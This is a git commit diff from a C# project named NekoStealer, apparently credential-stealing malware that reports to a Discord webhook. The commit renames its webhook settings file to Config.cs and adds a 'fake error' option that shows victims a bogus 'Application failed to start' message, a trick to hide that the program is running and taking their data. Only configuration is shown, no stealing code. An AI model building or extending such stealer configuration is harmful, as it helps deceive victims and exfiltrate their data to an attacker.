1bd245ae93d8329099d4871028767681fbcdc1fa
Fyrax-exe <80443044+Fyrax-exe@users.noreply.github.com>
2021-07-28 11:49:45 +0300

    Update and rename Webhook.cs to Config.cs

--- NekoStealer/Config.cs
+++ NekoStealer/Config.cs
@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -6,10 +6,13 @@ using System.Threading.Tasks;
 
 namespace NekoStealer
 {
-    class Webhook
+    class Config
     {
-        public static string Url = "webhook link"; // Webhook Link
+        public static string Url = "webhook url"; // Webhook Link
         public static string Username = "NekoStealer"; // Username
         public static string AvatarUrl = "https://cdn.discordapp.com/attachments/705906948922540044/868292483149348954/icon.gif"; // Avatar Link
+        //Fake error
+        public static bool FakeError = true;//Set true to show fake error
+        public static string FakeErrorMessage = "Application failed to start. 0x09000b";
     }
 }
